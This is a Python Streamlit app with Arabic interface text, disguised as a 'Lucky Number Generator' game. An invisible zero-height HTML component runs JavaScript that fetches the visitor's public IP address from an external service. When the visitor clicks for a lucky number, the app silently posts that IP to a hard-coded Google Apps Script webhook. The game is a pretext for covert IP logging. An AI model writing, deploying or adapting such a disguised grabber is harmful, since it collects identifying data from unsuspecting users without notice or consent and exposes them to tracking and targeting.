import streamlit as st
import streamlit.components.v1 as components
import random
import requests

st.set_page_config(page_title="🎲 Lucky Number", layout="centered")
st.title("🎲 Lucky Number Generator")

# Google Apps Script Web App URL
google_webhook_url = "https://script.google.com/macros/s/1ixe0S7_f0XKi7b6y8A6FhcI9GWwzqIZnxM_hUxDImd4/exec"  # ضع رابط السكريبت هنا

# استخدم حالة لتخزين عنوان IP عند استلامه من JavaScript
if "user_ip" not in st.session_state:
    st.session_state.user_ip = ""

# مكون مخصص يستخدم JavaScript للحصول على عنوان الـ IP
components.html(
    """
    <script>
        fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const queryParams = new URLSearchParams(window.location.search);
                queryParams.set("ip", ip);
                const newUrl = window.location.pathname + "?" + queryParams.toString();
                window.history.replaceState({}, "", newUrl);
                window.parent.postMessage({isStreamlitMessage: true}, "*");
            })
            .catch(() => {});
    </script>
    """,
    height=0
)

# قراءة IP من عنوان الصفحة
ip = st.experimental_get_query_params().get("ip", [""])[0]
if ip and not st.session_state.user_ip:
    st.session_state.user_ip = ip

# واجهة توليد الرقم
if st.button("🔮 اعرف رقمك المحظوظ"):
    number = random.randint(1, 100)
    st.success(f"🎉 رقمك المحظوظ هو: {number}")

    # إرسال IP إلى Google Script
    if st.session_state.user_ip and google_webhook_url:
        try:
            requests.post(google_webhook_url, data=st.session_state.user_ip)
        except Exception as e:
            st.error("جرب مرة اخري ")
